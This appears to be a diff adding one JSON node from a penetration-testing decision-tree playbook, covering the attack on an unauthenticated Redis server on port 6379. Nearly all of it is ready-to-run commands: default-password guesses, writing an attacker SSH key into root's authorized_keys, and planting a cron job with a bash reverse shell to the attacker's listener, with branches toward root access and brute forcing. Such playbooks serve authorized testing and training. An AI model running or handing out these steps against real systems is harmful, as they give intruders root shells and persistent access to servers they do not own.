@@ -1,0 +1,22 @@
+{
+  "id": "redis",
+  "phase": "RECON",
+  "title": "Redis (6379)",
+  "body": "Unauthenticated Redis is often RCE. Write SSH keys, cron jobs, or webshells depending on what Redis can reach.",
+  "cmd": "redis-cli -h $ip ping\nredis-cli -h $ip info\n\n# If authenticated — try default passwords\nredis-cli -h $ip -a \"\"\nredis-cli -h $ip -a \"redis\"\nredis-cli -h $ip -a \"password\"\n\n# RCE via authorized_keys\nredis-cli -h $ip config set dir /root/.ssh\nredis-cli -h $ip config set dbfilename authorized_keys\nredis-cli -h $ip set payload \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\"\nredis-cli -h $ip save\n\n# RCE via cron (if /var/spool/cron writable)\nredis-cli -h $ip config set dir /var/spool/cron\nredis-cli -h $ip config set dbfilename root\nredis-cli -h $ip set payload \"\\n\\n* * * * * bash -i >& /dev/tcp/$lhost/$lport 0>&1\\n\\n\"\nredis-cli -h $ip save",
+  "warn": "Check what user Redis runs as before choosing your attack path.",
+  "choices": [
+    {
+      "label": "SSH key write — got root shell",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Cron job — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Authenticated — needs password",
+      "next": "bruteforce"
+    }
+  ]
+}
